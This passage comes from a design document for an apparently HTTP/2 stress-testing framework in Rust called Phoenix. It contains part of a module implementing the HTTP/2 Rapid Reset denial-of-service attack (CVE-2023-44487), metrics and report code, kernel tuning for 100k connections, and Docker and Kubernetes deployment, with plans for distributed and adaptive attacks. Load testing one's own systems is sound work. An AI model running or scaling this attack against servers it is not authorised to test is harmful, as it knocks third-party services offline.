            errors: Vec::new(),
        })
    }
    
    fn name(&self) -> &'static str {
        "rapid_reset"
    }
    
    fn description(&self) -> &'static str {
        "HTTP/2 Rapid Reset attack (CVE-2023-44487). Opens many HTTP/2 streams and immediately resets them, overwhelming server resources."
    }
    
    fn config_schema(&self) -> serde_json::Value {
        json!({
            "type": "object",
            "properties": {
                "target": {
                    "type": "string",
                    "format": "uri",
                    "description": "Target URL"
                },
                "max_streams": {
                    "type": "integer",
                    "minimum": 1,
                    "maximum": 1000000,
                    "description": "Maximum number of streams to create"
                },
                "reset_interval_ms": {
                    "type": "integer",
                    "minimum": 0,
                    "maximum": 1000,
                    "description": "Delay between stream resets in milliseconds"
                },
                "headers": {
                    "type": "array",
                    "items": {
                        "type": "string"
                    },
                    "description": "HTTP headers to send"
                }
            },
            "required": ["target", "max_streams"]
        })
    }
    
    fn validate_config(&self, config: &serde_json::Value) -> Result<(), ValidationError> {
        // Validate configuration using JSON Schema
        let schema = self.config_schema();
        let compiled = jsonschema::JSONSchema::compile(&schema)
            .map_err(|e| ValidationError::Schema(e.to_string()))?;
        
        compiled.validate(config)
            .map_err(|errors| {
                ValidationError::Validation(
                    errors.map(|e| e.to_string()).collect::<Vec<_>>().join(", ")
                )
            })
    }
    
    fn as_any(&self) -> &dyn Any {
        self
    }
}

impl RapidResetAttack {
    async fn create_h2_client(&self) -> Result<h2::client::Sender<TcpStream>, AttackError> {
        let addr = self.parse_target()?;
        let tcp = TcpStream::connect(addr).await?;
        
        // Perform TLS handshake
        let tls_connector = TlsConnector::from(Arc::new(self.create_tls_config()));
        let tls_stream = tls_connector.connect(self.config.target.clone(), tcp).await?;
        
        // Perform HTTP/2 handshake
        let (client, h2) = h2::client::handshake(tls_stream).await?;
        
        // Spawn connection driver
        tokio::spawn(async move {
            if let Err(e) = h2.await {
                eprintln!("H2 connection error: {:?}", e);
            }
        });
        
        Ok(client)
    }
    
    fn build_request(&self, stream_id: usize) -> Request<()> {
        let mut request = Request::builder()
            .method("GET")
            .uri(&self.config.target)
            .version(Version::HTTP_2);
        
        // Add headers
        for header in &self.config.headers {
            if let Some((key, value)) = header.split_once(':') {
                request = request.header(key.trim(), value.trim());
            }
        }
        
        // Add stream-specific headers
        request = request.header("X-Stream-ID", stream_id.to_string());
        
        request.body(()).unwrap()
    }
}
```

## 9. Metrics and Reporting

### Comprehensive Metrics Collection

```rust
use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};
use std::time::{Duration, Instant};
use hdrhistogram::Histogram;
use serde::Serialize;

#[derive(Debug, Serialize)]
pub struct AttackMetrics {
    pub start_time: Instant,
    pub duration: Duration,
    
    // Request metrics
    pub requests_sent: AtomicU64,
    pub requests_successful: AtomicU64,
    pub requests_failed: AtomicU64,
    
    // Timing metrics
    pub latency_histogram: Mutex<Histogram<u64>>,
    pub min_latency: AtomicU64,
    pub max_latency: AtomicU64,
    pub total_latency: AtomicU64,
    
    // Connection metrics
    pub connections_established: AtomicU64,
    pub connections_failed: AtomicU64,
    pub connections_active: AtomicUsize,
    
    // HTTP/2 specific metrics
    pub streams_created: AtomicU64,
    pub streams_reset: AtomicU64,
    pub streams_completed: AtomicU64,
    pub goaway_frames: AtomicU64,
    
    // Error breakdown
    pub error_counts: Mutex<HashMap<String, u64>>,
    
    // Throughput
    pub bytes_sent: AtomicU64,
    pub bytes_received: AtomicU64,
    
    // Coordinated omission tracking
    pub omitted_requests: AtomicU64,
    pub total_omission_delay: AtomicU64,
    
    // Memory usage
    pub memory_allocated: AtomicUsize,
    pub memory_peak: AtomicUsize,
}

impl AttackMetrics {
    pub fn new() -> Self {
        Self {
            start_time: Instant::now(),
            duration: Duration::default(),
            requests_sent: AtomicU64::new(0),
            requests_successful: AtomicU64::new(0),
            requests_failed: AtomicU64::new(0),
            latency_histogram: Mutex::new(Histogram::new(3).unwrap()),
            min_latency: AtomicU64::new(u64::MAX),
            max_latency: AtomicU64::new(0),
            total_latency: AtomicU64::new(0),
            connections_established: AtomicU64::new(0),
            connections_failed: AtomicU64::new(0),
            connections_active: AtomicUsize::new(0),
            streams_created: AtomicU64::new(0),
            streams_reset: AtomicU64::new(0),
            streams_completed: AtomicU64::new(0),
            goaway_frames: AtomicU64::new(0),
            error_counts: Mutex::new(HashMap::new()),
            bytes_sent: AtomicU64::new(0),
            bytes_received: AtomicU64::new(0),
            omitted_requests: AtomicU64::new(0),
            total_omission_delay: AtomicU64::new(0),
            memory_allocated: AtomicUsize::new(0),
            memory_peak: AtomicUsize::new(0),
        }
    }
    
    pub fn record_request(&self, latency: Duration, success: bool, bytes_sent: usize, bytes_received: usize) {
        let latency_us = latency.as_micros() as u64;
        
        self.requests_sent.fetch_add(1, Ordering::Relaxed);
        
        if success {
            self.requests_successful.fetch_add(1, Ordering::Relaxed);
        } else {
            self.requests_failed.fetch_add(1, Ordering::Relaxed);
        }
        
        // Update latency statistics
        self.min_latency.fetch_min(latency_us, Ordering::Relaxed);
        self.max_latency.fetch_max(latency_us, Ordering::Relaxed);
        self.total_latency.fetch_add(latency_us, Ordering::Relaxed);
        
        // Record in histogram
        if let Ok(mut hist) = self.latency_histogram.lock() {
            let _ = hist.record(latency_us);
        }
        
        // Update throughput
        self.bytes_sent.fetch_add(bytes_sent as u64, Ordering::Relaxed);
        self.bytes_received.fetch_add(bytes_received as u64, Ordering::Relaxed);
    }
    
    pub fn record_error(&self, error: &PhoenixError) {
        let error_type = error.category().to_string();
        let mut errors = self.error_counts.lock().unwrap();
        *errors.entry(error_type).or_insert(0) += 1;
    }
    
    pub fn record_coordinated_omission(&self, delay: Duration) {
        self.omitted_requests.fetch_add(1, Ordering::Relaxed);
        self.total_omission_delay.fetch_add(delay.as_micros() as u64, Ordering::Relaxed);
    }
    
    pub fn snapshot(&self) -> MetricsSnapshot {
        let hist = self.latency_histogram.lock().unwrap();
        
        MetricsSnapshot {
            duration: self.start_time.elapsed(),
            requests_sent: self.requests_sent.load(Ordering::Relaxed),
            requests_successful: self.requests_successful.load(Ordering::Relaxed),
            requests_failed: self.requests_failed.load(Ordering::Relaxed),
            requests_per_second: self.requests_per_second(),
            error_rate: self.error_rate(),
            min_latency: Duration::from_micros(self.min_latency.load(Ordering::Relaxed)),
            max_latency: Duration::from_micros(self.max_latency.load(Ordering::Relaxed)),
            average_latency: self.average_latency(),
            p50_latency: Duration::from_micros(hist.value_at_percentile(50.0)),
            p95_latency: Duration::from_micros(hist.value_at_percentile(95.0)),
            p99_latency: Duration::from_micros(hist.value_at_percentile(99.0)),
            p999_latency: Duration::from_micros(hist.value_at_percentile(99.9)),
            connections_established: self.connections_established.load(Ordering::Relaxed),
            connections_failed: self.connections_failed.load(Ordering::Relaxed),
            connections_active: self.connections_active.load(Ordering::Relaxed),
            bytes_sent: self.bytes_sent.load(Ordering::Relaxed),
            bytes_received: self.bytes_received.load(Ordering::Relaxed),
            throughput_mbps: self.throughput_mbps(),
            omitted_requests: self.omitted_requests.load(Ordering::Relaxed),
            average_omission_delay: self.average_omission_delay(),
            coordinated_omission_score: self.coordinated_omission_score(),
            error_counts: self.error_counts.lock().unwrap().clone(),
            memory_allocated: self.memory_allocated.load(Ordering::Relaxed),
            memory_peak: self.memory_peak.load(Ordering::Relaxed),
        }
    }
    
    pub fn requests_per_second(&self) -> f64 {
        let elapsed = self.start_time.elapsed();
        if elapsed.as_secs() > 0 {
            self.requests_sent.load(Ordering::Relaxed) as f64 / elapsed.as_secs_f64()
        } else {
            0.0
        }
    }
    
    pub fn error_rate(&self) -> f64 {
        let sent = self.requests_sent.load(Ordering::Relaxed);
        if sent > 0 {
            self.requests_failed.load(Ordering::Relaxed) as f64 / sent as f64
        } else {
            0.0
        }
    }
    
    pub fn average_latency(&self) -> Option<Duration> {
        let samples = self.requests_successful.load(Ordering::Relaxed);
        if samples > 0 {
            let total = self.total_latency.load(Ordering::Relaxed);
            Some(Duration::from_micros(total / samples))
        } else {
            None
        }
    }
    
    pub fn throughput_mbps(&self) -> f64 {
        let elapsed = self.start_time.elapsed();
        if elapsed.as_secs() > 0 {
            let total_bytes = self.bytes_sent.load(Ordering::Relaxed) + self.bytes_received.load(Ordering::Relaxed);
            (total_bytes as f64 * 8.0) / (elapsed.as_secs_f64() * 1_000_000.0)
        } else {
            0.0
        }
    }
    
    pub fn average_omission_delay(&self) -> Option<Duration> {
        let omitted = self.omitted_requests.load(Ordering::Relaxed);
        if omitted > 0 {
            let total = self.total_omission_delay.load(Ordering::Relaxed);
            Some(Duration::from_micros(total / omitted))
        } else {
            None
        }
    }
    
    pub fn coordinated_omission_score(&self) -> f64 {
        let omitted = self.omitted_requests.load(Ordering::Relaxed);
        let total = self.requests_sent.load(Ordering::Relaxed);
        
        if total > 0 {
            omitted as f64 / total as f64
        } else {
            0.0
        }
    }
}

// Report generation
#[derive(Debug, Serialize)]
pub struct AttackReport {
    pub summary: ReportSummary,
    pub metrics: MetricsSnapshot,
    pub timeline: Vec<TimeSlice>,
    pub errors: Vec<ErrorSummary>,
    pub recommendations: Vec<String>,
    pub raw_data: Option<RawData>,
}

impl AttackReport {
    pub fn generate(metrics: &AttackMetrics, config: &PhoenixConfig) -> Self {
        let snapshot = metrics.snapshot();
        
        Self {
            summary: ReportSummary::from_snapshot(&snapshot, config),
            metrics: snapshot,
            timeline: Vec::new(),  // Would be populated during attack
            errors: Vec::new(),    // Would be populated from error tracking
            recommendations: Self::generate_recommendations(&snapshot),
            raw_data: None,
        }
    }
    
    fn generate_recommendations(snapshot: &MetricsSnapshot) -> Vec<String> {
        let mut recommendations = Vec::new();
        
        // Analyze metrics and generate recommendations
        if snapshot.error_rate > 0.05 {
            recommendations.push("High error rate detected. Consider reducing request rate or checking target availability.".to_string());
        }
        
        if snapshot.p95_latency > Duration::from_secs(1) {
            recommendations.push("High latency detected. Target may be overloaded or network conditions poor.".to_string());
        }
        
        if snapshot.coordinated_omission_score > 0.1 {
            recommendations.push("Significant coordinated omission detected. Consider using a more powerful test machine or reducing target RPS.".to_string());
        }
        
        if snapshot.connections_failed > snapshot.connections_established * 0.1 {
            recommendations.push("High connection failure rate. Check network connectivity and target capacity.".to_string());
        }
        
        recommendations
    }
    
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }
    
    pub fn to_yaml(&self) -> Result<String, serde_yaml::Error> {
        serde_yaml::to_string(self)
    }
    
    pub fn to_html(&self) -> String {
        format!(
            r#"<!DOCTYPE html>
<html>
<head>
    <title>Phoenix Attack Report</title>
    <style>
        body {{ font-family: monospace; margin: 20px; }}
        .summary {{ background: #f0f0f0; padding: 15px; border-radius: 5px; }}
        .metric {{ margin: 5px 0; }}
        .error {{ color: #d00; }}
        .warning {{ color: #c60; }}
        .success {{ color: #090; }}
    </style>
</head>
<body>
    <h1>Phoenix Attack Report</h1>
    <div class="summary">
        <h2>Summary</h2>
        <div class="metric">Duration: {:?}</div>
        <div class="metric">Requests: {}</div>
        <div class="metric">RPS: {:.2}</div>
        <div class="metric">Error Rate: {:.2%}</div>
        <div class="metric">Average Latency: {:?}</div>
    </div>
    <h2>Recommendations</h2>
    <ul>
        {}
    </ul>
</body>
</html>"#,
            self.metrics.duration,
            self.metrics.requests_sent,
            self.metrics.requests_per_second,
            self.metrics.error_rate,
            self.metrics.average_latency.unwrap_or_default(),
            self.recommendations.iter()
                .map(|r| format!("<li>{}</li>", r))
                .collect::<String>()
        )
    }
}
```

## 10. Deployment and Scaling Considerations

### Resource Requirements

**Minimum Hardware Requirements:**
- **CPU**: 4+ cores (8+ recommended for 100k connections)
- **RAM**: 8GB (16GB+ recommended for large connection pools)
- **Network**: 1Gbps+ NIC (10Gbps recommended for high RPS)
- **Storage**: 1GB for binaries and logs

**Optimal Configuration for 100k Connections:**
```yaml
system_tuning:
  # Linux kernel tuning
  net.core.somaxconn: 65535
  net.ipv4.tcp_max_syn_backlog: 65535
  net.ipv4.ip_local_port_range: "1024 65535"
  net.ipv4.tcp_tw_reuse: 1
  net.ipv4.tcp_tw_recycle: 0  # Disabled in modern kernels
  net.ipv4.tcp_max_tw_buckets: 2000000
  
  # File descriptor limits
  fs.file-max: 1000000
  fs.nr_open: 1000000
  
  # Memory tuning
  vm.swappiness: 10
  vm.dirty_ratio: 60
  vm.dirty_background_ratio: 10
  
phoenix_config:
  runtime:
    worker_threads: 8
    max_blocking_threads: 100
    thread_stack_size: "2MB"
    
  memory:
    connection_pool_size: 10000
    task_pool_size: 100000
    buffer_pool_size: "1GB"
    
  network:
    tcp_buffer_size: "4MB"
    max_connections: 100000
    connection_timeout: "30s"
```

### Docker Deployment

```dockerfile
# Dockerfile
FROM rust:1.75-alpine AS builder

# Install build dependencies
RUN apk add --no-cache musl-dev openssl-dev openssl-libs-static

# Create app directory
WORKDIR /app

# Copy manifests
COPY Cargo.toml Cargo.lock ./

# Copy source code
COPY src ./src

# Build for release
RUN cargo build --release --target x86_64-unknown-linux-musl

# Runtime image
FROM alpine:latest

# Install runtime dependencies
RUN apk add --no-cache ca-certificates openssl

# Create non-root user
RUN addgroup -S phoenix && adduser -S phoenix -G phoenix

# Copy binary
COPY --from=builder /app/target/x86_64-unknown-linux-musl/release/phoenix /usr/local/bin/phoenix

# Set permissions
RUN chown phoenix:phoenix /usr/local/bin/phoenix
RUN chmod +x /usr/local/bin/phoenix

# Switch to non-root user
USER phoenix

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD phoenix health-check || exit 1

# Entrypoint
ENTRYPOINT ["phoenix"]
CMD ["--help"]
```

### Kubernetes Deployment

```yaml
# phoenix-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: phoenix
  labels:
    app: phoenix
spec:
  replicas: 3
  selector:
    matchLabels:
      app: phoenix
  template:
    metadata:
      labels:
        app: phoenix
    spec:
      securityContext:
        sysctls:
          - name: net.core.somaxconn
            value: "65535"
          - name: net.ipv4.ip_local_port_range
            value: "1024 65535"
      containers:
      - name: phoenix
        image: phoenix:latest
        imagePullPolicy: Always
        resources:
          limits:
            cpu: "4"
            memory: "8Gi"
          requests:
            cpu: "2"
            memory: "4Gi"
        securityContext:
          capabilities:
            add: ["NET_ADMIN", "SYS_RESOURCE"]
        env:
        - name: RUST_LOG
          value: "info"
        - name: PHOENIX_CONFIG
          value: "/config/phoenix.toml"
        volumeMounts:
        - name: config
          mountPath: /config
        - name: results
          mountPath: /results
        ports:
        - containerPort: 8080
          name: metrics
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /ready
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
      volumes:
      - name: config
        configMap:
          name: phoenix-config
      - name: results
        persistentVolumeClaim:
          claimName: phoenix-results
---
apiVersion: v1
kind: Service
metadata:
  name: phoenix
spec:
  selector:
    app: phoenix
  ports:
  - port: 8080
    targetPort: 8080
    name: metrics
  type: ClusterIP
```

### Monitoring and Alerting

```rust
// Prometheus metrics exporter
use prometheus::{Counter, Gauge, Histogram, Registry};

struct MetricsExporter {
    registry: Registry,
    requests_total: Counter,
    requests_duration: Histogram,
    connections_active: Gauge,
    error_rate: Gauge,
    rps: Gauge,
    memory_usage: Gauge,
}

impl MetricsExporter {
    fn new() -> Self {
        let registry = Registry::new();
        
        let requests_total = Counter::new(
            "phoenix_requests_total",
            "Total number of requests"
        ).unwrap();
        
        let requests_duration = Histogram::with_opts(
            prometheus::HistogramOpts::new(
                "phoenix_request_duration_seconds",
                "Request duration in seconds"
            )
            .buckets(vec![0.001, 0.005, 0.01, 0.05, 0.1, 0.5, 1.0, 5.0])
        ).unwrap();
        
        let connections_active = Gauge::new(
            "phoenix_connections_active",
            "Number of active connections"
        ).unwrap();
        
        let error_rate = Gauge::new(
            "phoenix_error_rate",
            "Current error rate"
        ).unwrap();
        
        let rps = Gauge::new(
            "phoenix_requests_per_second",
            "Current requests per second"
        ).unwrap();
        
        let memory_usage = Gauge::new(
            "phoenix_memory_usage_bytes",
            "Current memory usage in bytes"
        ).unwrap();
        
        // Register metrics
        registry.register(Box::new(requests_total.clone())).unwrap();
        registry.register(Box::new(requests_duration.clone())).unwrap();
        registry.register(Box::new(connections_active.clone())).unwrap();
        registry.register(Box::new(error_rate.clone())).unwrap();
        registry.register(Box::new(rps.clone())).unwrap();
        registry.register(Box::new(memory_usage.clone())).unwrap();
        
        Self {
            registry,
            requests_total,
            requests_duration,
            connections_active,
            error_rate,
            rps,
            memory_usage,
        }
    }
    
    async fn update_from_metrics(&self, metrics: &AttackMetrics) {
        let snapshot = metrics.snapshot();
        
        self.requests_total.inc_by(snapshot.requests_sent as f64);
        self.connections_active.set(snapshot.connections_active as f64);
        self.error_rate.set(snapshot.error_rate);
        self.rps.set(snapshot.requests_per_second);
        self.memory_usage.set(snapshot.memory_allocated as f64);
        
        // Update histogram from snapshot
        // (would need to track individual request durations)
    }
    
    async fn serve_metrics(&self) -> Result<(), hyper::Error> {
        use hyper::service::{make_service_fn, service_fn};
        use hyper::{Body, Request, Response, Server};
        
        let registry = self.registry.clone();
        
        let make_svc = make_service_fn(move |_conn| {
            let registry = registry.clone();
            async move {
                Ok::<_, hyper::Error>(service_fn(move |_req: Request<Body>| {
                    let registry = registry.clone();
                    async move {
                        let metric_families = registry.gather();
                        let mut buffer = vec![];
                        let encoder = prometheus::TextEncoder::new();
                        encoder.encode(&metric_families, &mut buffer).unwrap();
                        
                        Ok::<_, hyper::Error>(Response::new(Body::from(buffer)))
                    }
                }))
            }
        });
        
        let addr = ([0, 0, 0, 0], 8080).into();
        let server = Server::bind(&addr).serve(make_svc);
        
        server.await
    }
}
```

## Conclusion

This architecture provides a comprehensive foundation for building a high-performance HTTP/2 stress testing framework in Rust. Key takeaways:

1. **Massive Concurrency**: Use `FuturesUnordered` for connection handling, worker pools for task distribution
2. **Connection Pooling**: Implement intelligent HTTP/2 connection pools with health checking
3. **Rate Limiting**: Use coordinated omission-aware rate limiting for accurate benchmarks
4. **Error Handling**: Comprehensive error hierarchy with retry logic and circuit breakers
5. **Performance**: Extensive profiling and optimization at all levels
6. **Extensibility**: Plugin-based architecture for attack modules
7. **Observability**: Comprehensive metrics collection and reporting
8. **Production Ready**: Docker and Kubernetes deployment configurations

The framework is designed to handle 100k+ concurrent connections while maintaining accurate metrics, handling backpressure, and providing detailed insights into target system behavior under stress.

## Future Enhancements

1. **Distributed Testing**: Coordinate multiple Phoenix instances for distributed load testing
2. **AI-Driven Attacks**: Machine learning to adapt attack patterns based on target responses
3. **Real-time Analysis**: Stream processing of metrics for immediate insights
4. **Protocol Extensions**: Support for HTTP/3, WebSocket, and other protocols
5. **Cloud Integration**: Native integration with AWS, GCP, Azure for cloud-scale testing
6. **Security Scanning**: Integration with vulnerability scanners for comprehensive security testing
7. **Compliance Testing**: Built-in tests for regulatory compliance (GDPR, HIPAA, etc.)

This architecture provides a solid foundation that can be extended and customized for specific testing requirements while maintaining high performance and reliability.